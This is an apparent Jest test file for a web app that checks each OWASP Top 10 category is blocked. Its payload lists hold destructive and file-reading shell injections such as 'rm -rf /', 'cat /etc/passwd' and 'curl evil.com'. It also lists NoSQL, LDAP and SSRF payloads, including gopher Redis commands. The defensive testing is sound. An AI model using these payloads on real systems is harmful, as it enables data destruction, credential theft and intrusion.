import { PrismaClient } from '@prisma/client'
import { PenetrationTestSuite } from '@/lib/security/penetration-test-suite'
import { createAuthHelper, AuthTestHelper } from '../utils/auth-helpers'
import { createTestDatabase, TestDatabase } from '../utils/test-database'
import { testUsers } from '../fixtures/users'

describe('Penetration Testing Suite', () => {
  let testDb: TestDatabase
  let prisma: PrismaClient
  let authHelper: AuthTestHelper
  let penTestSuite: PenetrationTestSuite

  beforeAll(async () => {
    testDb = createTestDatabase()
    await testDb.setup()
    prisma = testDb.getClient()
    authHelper = createAuthHelper(prisma)
    penTestSuite = new PenetrationTestSuite({
      baseUrl: 'http://localhost:3000',
      prisma,
    })
  })

  afterAll(async () => {
    await testDb.cleanup()
  })

  beforeEach(async () => {
    await testDb.reset()
  })

  describe('OWASP Top 10 Security Testing', () => {
    describe('A01: Broken Access Control', () => {
      it('should prevent horizontal privilege escalation', async () => {
        const user1 = await authHelper.createTestUser(testUsers.customer1)
        const user2 = await authHelper.createTestUser(testUsers.customer2)

        // User 1 creates a resource
        const resource = await prisma.userResource.create({
          data: {
            userId: user1.id,
            title: 'Private Document',
            content: 'Sensitive information',
          }
        })

        // User 2 attempts to access User 1's resource
        const accessAttempt = await penTestSuite.testUnauthorizedAccess({
          endpoint: `/api/resources/${resource.id}`,
          method: 'GET',
          authenticatedAs: user2.id,
        })

        expect(accessAttempt.blocked).toBe(true)
        expect(accessAttempt.statusCode).toBe(403)
        expect(accessAttempt.dataLeakage).toBe(false)
      })

      it('should prevent vertical privilege escalation', async () => {
        const customer = await authHelper.createTestUser(testUsers.customer1)
        const admin = await authHelper.createTestUser(testUsers.superAdmin)

        // Customer attempts to access admin functionality
        const escalationAttempts = [
          { endpoint: '/api/admin/users', method: 'GET' },
          { endpoint: '/api/admin/system-config', method: 'POST' },
          { endpoint: '/api/admin/audit-logs', method: 'GET' },
          { endpoint: '/api/admin/delete-user', method: 'DELETE' },
        ]

        for (const attempt of escalationAttempts) {
          const result = await penTestSuite.testUnauthorizedAccess({
            ...attempt,
            authenticatedAs: customer.id,
          })

          expect(result.blocked).toBe(true)
          expect(result.statusCode).toBeOneOf([401, 403])
        }
      })

      it('should prevent IDOR (Insecure Direct Object Reference)', () => {
        const idorTests = [
          { endpoint: '/api/users/{id}', idField: 'id' },
          { endpoint: '/api/organizations/{orgId}', idField: 'orgId' },
          { endpoint: '/api/orders/{orderId}', idField: 'orderId' },
          { endpoint: '/api/warehouses/{warehouseId}', idField: 'warehouseId' },
        ]

        return Promise.all(idorTests.map(async (test) => {
          const result = await penTestSuite.testIDOR({
            endpoint: test.endpoint,
            idField: test.idField,
            testCases: [
              { id: '1', expected: 'forbidden' },
              { id: '999999', expected: 'not_found' },
              { id: '../admin', expected: 'bad_request' },
              { id: 'null', expected: 'bad_request' },
              { id: '{id}', expected: 'bad_request' },
            ]
          })

          expect(result.vulnerabilityFound).toBe(false)
          expect(result.dataExposed).toBe(false)
        }))
      })
    })

    describe('A02: Cryptographic Failures', () => {
      it('should use secure password hashing', async () => {
        const user = await authHelper.createTestUser(testUsers.customer1)

        const dbUser = await prisma.user.findUnique({
          where: { id: user.id },
        })

        const cryptoTest = await penTestSuite.testPasswordSecurity(dbUser.password)

        expect(cryptoTest.isHashed).toBe(true)
        expect(cryptoTest.algorithm).toBe('bcrypt')
        expect(cryptoTest.rounds).toBeGreaterThanOrEqual(10)
        expect(cryptoTest.vulnerabilities).toHaveLength(0)
      })

      it('should protect sensitive data in transit', async () => {
        const tlsTest = await penTestSuite.testTLSConfiguration({
          host: 'localhost',
          port: 3000,
        })

        expect(tlsTest.tlsVersion).toMatch(/^TLSv1\.[23]$/)
        expect(tlsTest.cipherSuites).not.toContain('RC4')
        expect(tlsTest.cipherSuites).not.toContain('DES')
        expect(tlsTest.cipherSuites).not.toContain('MD5')
        expect(tlsTest.hstsEnabled).toBe(true)
        expect(tlsTest.vulnerabilities).toHaveLength(0)
      })

      it('should protect sensitive data at rest', async () => {
        const user = await authHelper.createTestUser({
          ...testUsers.customer1,
          sensitiveData: 'credit-card-1234567890123456',
        })

        const encryptionTest = await penTestSuite.testDataEncryption(user.id)

        expect(encryptionTest.sensitiveFieldsEncrypted).toBe(true)
        expect(encryptionTest.clearTextFound).toBe(false)
        expect(encryptionTest.weakEncryption).toBe(false)
      })
    })

    describe('A03: Injection Attacks', () => {
      it('should prevent NoSQL injection', async () => {
        const nosqlPayloads = [
          { $ne: null },
          { $regex: '.*' },
          { $where: 'this.password.length > 0' },
          { $or: [{ password: '' }, { password: { $exists: false } }] },
        ]

        for (const payload of nosqlPayloads) {
          const result = await penTestSuite.testNoSQLInjection({
            endpoint: '/api/users/search',
            payload,
          })

          expect(result.vulnerable).toBe(false)
          expect(result.dataExposed).toBe(false)
        }
      })

      it('should prevent command injection', async () => {
        const commandPayloads = [
          '; rm -rf /',
          '| cat /etc/passwd',
          '&& curl evil.com',
          '`whoami`',
          '$(cat /etc/passwd)',
          'test; sleep 10',
        ]

        for (const payload of commandPayloads) {
          const result = await penTestSuite.testCommandInjection({
            endpoint: '/api/system/execute',
            parameter: 'command',
            payload,
          })

          expect(result.executed).toBe(false)
          expect(result.timeDelay).toBeLessThan(1000) // No sleep commands executed
        }
      })

      it('should prevent LDAP injection', async () => {
        const ldapPayloads = [
          '*)(uid=*',
          '*)|(objectClass=*',
          ')(cn=*))(|(cn=*',
          '*)(userPassword=*',
        ]

        for (const payload of ldapPayloads) {
          const result = await penTestSuite.testLDAPInjection({
            endpoint: '/api/ldap/search',
            parameter: 'filter',
            payload,
          })

          expect(result.vulnerable).toBe(false)
          expect(result.unauthorizedAccess).toBe(false)
        }
      })
    })

    describe('A04: Insecure Design', () => {
      it('should implement proper business logic controls', async () => {
        const user = await authHelper.createTestUser(testUsers.businessManager1)

        const businessLogicTests = [
          // Negative price test
          {
            name: 'Negative Price Order',
            test: () => penTestSuite.testBusinessLogic({
              action: 'create_order',
              params: { price: -100, quantity: 1 },
              userId: user.id,
            }),
            expected: { allowed: false, reason: 'invalid_price' }
          },
          // Excessive quantity test
          {
            name: 'Excessive Quantity',
            test: () => penTestSuite.testBusinessLogic({
              action: 'create_order',
              params: { price: 100, quantity: 999999 },
              userId: user.id,
            }),
            expected: { allowed: false, reason: 'quantity_limit' }
          },
          // Workflow bypass test
          {
            name: 'Workflow Bypass',
            test: () => penTestSuite.testBusinessLogic({
              action: 'approve_order',
              params: { orderId: 'non-existent' },
              userId: user.id,
            }),
            expected: { allowed: false, reason: 'order_not_found' }
          },
        ]

        for (const testCase of businessLogicTests) {
          const result = await testCase.test()
          expect(result.allowed).toBe(testCase.expected.allowed)
          expect(result.reason).toBe(testCase.expected.reason)
        }
      })

      it('should prevent race condition attacks', async () => {
        const user = await authHelper.createTestUser(testUsers.customer1)

        // Create account with balance
        await prisma.account.create({
          data: {
            userId: user.id,
            balance: 1000,
          }
        })

        // Attempt concurrent withdrawals
        const concurrentWithdrawals = Array(10).fill(null).map(() =>
          penTestSuite.testRaceCondition({
            endpoint: '/api/account/withdraw',
            method: 'POST',
            body: { amount: 200 },
            userId: user.id,
          })
        )

        const results = await Promise.allSettled(concurrentWithdrawals)
        const successful = results.filter(r =>
          r.status === 'fulfilled' && r.value.success
        ).length

        // Should only allow successful withdrawals up to available balance
        expect(successful).toBeLessThanOrEqual(5) // Max 5 * 200 = 1000
      })
    })

    describe('A05: Security Misconfiguration', () => {
      it('should have secure HTTP headers', async () => {
        const headerTest = await penTestSuite.testSecurityHeaders({
          url: 'http://localhost:3000',
        })

        expect(headerTest.headers).toMatchObject({
          'X-Frame-Options': expect.stringMatching(/DENY|SAMEORIGIN/),
          'X-Content-Type-Options': 'nosniff',
          'X-XSS-Protection': '1; mode=block',
          'Referrer-Policy': expect.any(String),
          'Content-Security-Policy': expect.any(String),
        })

        expect(headerTest.vulnerabilities).toHaveLength(0)
      })

      it('should not expose sensitive configuration', async () => {
        const configTest = await penTestSuite.testConfigurationExposure({
          endpoints: [
            '/.env',
            '/config.json',
            '/package.json',
            '/.git/config',
            '/admin',
            '/debug',
            '/actuator',
          ]
        })

        expect(configTest.exposedFiles).toHaveLength(0)
        expect(configTest.sensitiveDataFound).toBe(false)
      })

      it('should handle errors securely', async () => {
        const errorTests = [
          { endpoint: '/api/nonexistent', expected: 404 },
          { endpoint: '/api/users/invalid-id', expected: 400 },
          { endpoint: '/api/admin/restricted', expected: 401 },
        ]

        for (const test of errorTests) {
          const result = await penTestSuite.testErrorHandling(test.endpoint)

          expect(result.statusCode).toBe(test.expected)
          expect(result.stackTraceExposed).toBe(false)
          expect(result.sensitiveInfoExposed).toBe(false)
          expect(result.debugInfoExposed).toBe(false)
        }
      })
    })

    describe('A06: Vulnerable Components', () => {
      it('should not use known vulnerable dependencies', async () => {
        const dependencyTest = await penTestSuite.testDependencyVulnerabilities()

        expect(dependencyTest.criticalVulnerabilities).toBe(0)
        expect(dependencyTest.highVulnerabilities).toBe(0)
        expect(dependencyTest.outdatedCriticalPackages).toHaveLength(0)
      })

      it('should have proper version pinning', async () => {
        const versionTest = await penTestSuite.testVersionPinning()

        expect(versionTest.unpinnedDependencies.length).toBe(0)
        expect(versionTest.wildcardVersions.length).toBe(0)
      })
    })

    describe('A07: Authentication Failures', () => {
      it('should prevent credential stuffing', async () => {
        const credentialLists = [
          { email: 'admin@example.com', password: 'admin' },
          { email: 'test@example.com', password: 'password' },
          { email: 'user@example.com', password: '123456' },
        ]

        const results = await Promise.all(
          credentialLists.map(creds =>
            penTestSuite.testCredentialStuffing(creds)
          )
        )

        // Should be blocked after multiple attempts
        expect(results.every(r => r.blocked)).toBe(true)
      })

      it('should enforce strong session management', async () => {
        const user = await authHelper.createTestUser(testUsers.customer1)

        const sessionTest = await penTestSuite.testSessionSecurity({
          userId: user.id,
        })

        expect(sessionTest.sessionFixation).toBe(false)
        expect(sessionTest.sessionHijacking).toBe(false)
        expect(sessionTest.concurrentSessionsLimited).toBe(true)
        expect(sessionTest.sessionTimeout).toBeLessThanOrEqual(86400) // 24 hours max
      })
    })

    describe('A08: Data Integrity Failures', () => {
      it('should validate data integrity', async () => {
        const integrityTest = await penTestSuite.testDataIntegrity({
          model: 'User',
          operations: ['create', 'update', 'delete'],
        })

        expect(integrityTest.checksumValidation).toBe(true)
        expect(integrityTest.tampering).toBe(false)
        expect(integrityTest.integrityViolations).toHaveLength(0)
      })

      it('should prevent data tampering in transit', async () => {
        const tamperingTest = await penTestSuite.testDataTampering({
          endpoint: '/api/users/update',
          method: 'PUT',
        })

        expect(tamperingTest.tamperingDetected).toBe(false)
        expect(tamperingTest.integrityMaintained).toBe(true)
      })
    })

    describe('A09: Security Logging Failures', () => {
      it('should log security events properly', async () => {
        const user = await authHelper.createTestUser(testUsers.customer1)

        // Trigger various security events
        await penTestSuite.triggerSecurityEvents([
          { type: 'failed_login', userId: user.id },
          { type: 'privilege_escalation_attempt', userId: user.id },
          { type: 'suspicious_activity', userId: user.id },
        ])

        const loggingTest = await penTestSuite.testSecurityLogging()

        expect(loggingTest.eventsLogged).toBe(true)
        expect(loggingTest.logIntegrity).toBe(true)
        expect(loggingTest.sensitiveDataInLogs).toBe(false)
        expect(loggingTest.logTampering).toBe(false)
      })
    })

    describe('A10: Server-Side Request Forgery (SSRF)', () => {
      it('should prevent SSRF attacks', async () => {
        const ssrfPayloads = [
          'http://localhost:22',
          'http://127.0.0.1:6379',
          'file:///etc/passwd',
          'gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a',
          'dict://localhost:11211/stats',
        ]

        for (const payload of ssrfPayloads) {
          const result = await penTestSuite.testSSRF({
            endpoint: '/api/fetch-url',
            parameter: 'url',
            payload,
          })

          expect(result.blocked).toBe(true)
          expect(result.internalServiceAccessed).toBe(false)
        }
      })
    })
  })

  describe('Automated Security Scanning', () => {
    it('should perform comprehensive security scan', async () => {
      const scanResult = await penTestSuite.runFullSecurityScan({
        target: 'http://localhost:3000',
        depth: 'comprehensive',
        includeTests: [
          'owasp-top-10',
          'authentication',
          'authorization',
          'data-validation',
          'session-management',
          'error-handling',
          'logging',
          'encryption',
        ]
      })

      expect(scanResult.summary.criticalIssues).toBe(0)
      expect(scanResult.summary.highIssues).toBe(0)
      expect(scanResult.summary.securityScore).toBeGreaterThanOrEqual(85)
      expect(scanResult.overallRating).toBeOneOf(['SECURE', 'GOOD'])
    })

    it('should generate security report', async () => {
      const report = await penTestSuite.generateSecurityReport({
        includeRecommendations: true,
        includeCompliance: true,
        format: 'json',
      })

      expect(report.metadata).toBeDefined()
      expect(report.executiveSummary).toBeDefined()
      expect(report.findings).toBeInstanceOf(Array)
      expect(report.recommendations).toBeInstanceOf(Array)
      expect(report.compliance.gdpr).toBeDefined()
      expect(report.compliance.pciDss).toBeDefined()
      expect(report.compliance.soc2).toBeDefined()
    })
  })
})